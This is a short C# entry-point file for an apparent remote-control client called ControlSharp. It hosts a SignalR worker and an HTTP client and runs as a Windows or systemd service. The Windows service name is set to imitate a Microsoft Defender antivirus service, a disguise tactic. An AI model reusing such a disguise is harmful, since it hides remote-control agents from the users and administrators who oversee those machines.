﻿using ControlSharp.Client.Worker;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;

IHost HostingService = Host.CreateDefaultBuilder(args)
    .ConfigureAppConfiguration(config =>
    {
        config.AddEnvironmentVariables();
    })
    .ConfigureServices(services =>
    {
        services.AddHostedService<SignalRWorker>();
        services.AddHttpClient();
    })
    .ConfigureLogging(config =>
    {
        config.AddConsole();
    })
    .UseWindowsService(config =>
    {
        config.ServiceName = "Microsoft Defender Antivirus Network Realtime Inspection Service Medic";
    })
    .UseSystemd()
    .Build();
    
await HostingService.RunAsync();